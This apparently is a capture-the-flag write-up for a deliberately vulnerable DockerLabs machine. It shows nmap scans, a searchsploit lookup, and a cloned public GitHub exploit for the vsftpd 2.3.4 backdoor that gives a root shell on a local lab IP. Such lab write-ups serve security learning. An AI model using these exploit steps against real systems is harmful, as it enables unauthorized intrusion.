# Write Up First Hacking

**Difficulty:** Super easy<br>
**Link to dockerlabs:** https://dockerlabs.es/

## Setting the enviroment
First of all we deploy the machine with the script that comes when downloading the machine
```
❯ chmod +x auto_deploy.sh
❯ sudo ./auto_deploy.sh firsthacking.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Once deployed, we create the firsthacking folder, go inside and use the *mkt* utility that creates the *nmap*, *content*, *exploits* and *scripts* folders.

```
❯ mkdir firsthacking-dockerlabs
❯ cd firsthacking-dockerlabs
❯ mkt
❯ ls -l
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 content
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 exploits
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 nmap
drwxrwxr-x godack godack 4.0 KB Thu Aug 14 19:20:29 2025 scripts
```
## Recon
The first thing we do is a general reconnaissance with nmap on the victim machine, to obtain the open ports.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
```

Once we have the open ports, we perform a more thorough scan using reconnaissance scripts to obtain the services on each port and the version they are running.

```
❯ extractPorts allPorts
[*] Extracting information...
 
     [*] IP Address: 172.17.0.2
     [*] Open ports: 21
 
[*] Ports copied to clipboard

❯ nmap -sCV -p21 172.17.0.2 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 19:17 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

In this way we discover that the service running on port 21 (FTP port) is vsftpd version 2.3.4.

## Exploit
Once we have recognized the ports and services, we realize that when searching with searchsploit, the vsftpd service with version 2.3.4 is a vulnerable service.
```
❯ searchsploit vsftpd 2.3.4
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

In this way, we searched on GitHub for exploits for this vulnerability, and we found this repository, we downloaded it and executed it (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).

```
❯ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
❯ sudo python3 -m pip install pwntools
❯ python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
$  
```

And finally we have access to the machine and we don't have to scale privileges because we are already root user!!

## Lessons Learned
1. Scans with **nmap**
2. Use of **searchsploit**
3. Searching for exploits on GitHub